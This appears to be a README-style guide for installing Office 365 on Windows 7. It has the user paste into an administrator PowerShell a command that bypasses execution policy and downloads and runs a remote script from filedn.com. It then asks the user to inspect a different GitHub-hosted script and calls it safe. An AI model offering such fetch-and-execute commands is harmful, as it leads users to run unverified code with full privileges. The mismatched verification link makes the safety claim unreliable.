
# Download and Install Office 365 on Windows 7




## Install Office 365 on Windows 7

The latest version of Office 365 apps which will run on Windows 7 is version 2002 and the latest version of Office Deployment Tool (ODT) seems no longer works in Windows 7.
  
## Installation

Search then open Windows PowerShell as administrator.


![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/pNJxSkLlqz8Y0vf59mzXBUs8CK6RDuPk8EcOJNz8FQXTy3zoHTbzAEbPlNf1.jpg)

Copy then right click to paste all below commands into PowerShell window at once then hit Enter.

```bash
$url="https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Files/7/install.ps1"
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
Set-ExecutionPolicy Bypass -Scope Process -Force
iex ((New-Object System.Net.WebClient).DownloadString($url))
```

![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/QwCFT6xksoCXnWySzZwhJ6ee1HCHEBiWeoF70lZPr2XfQ2zPTkvQf6UiKpFG.jpg)


➡️Please inspect [https://raw.githubusercontent.com/bonben365/office365-win7/main/install.ps1](https://raw.githubusercontent.com/bonben365/office365-win7/main/install.ps1) prior to running any of these scripts to ensure safety. We already know it's safe, but you should verify the security and contents of any script from the internet you are not familiar with.

## Documentation

[🌍https://bonben365.com/](https://bonben365.com/)

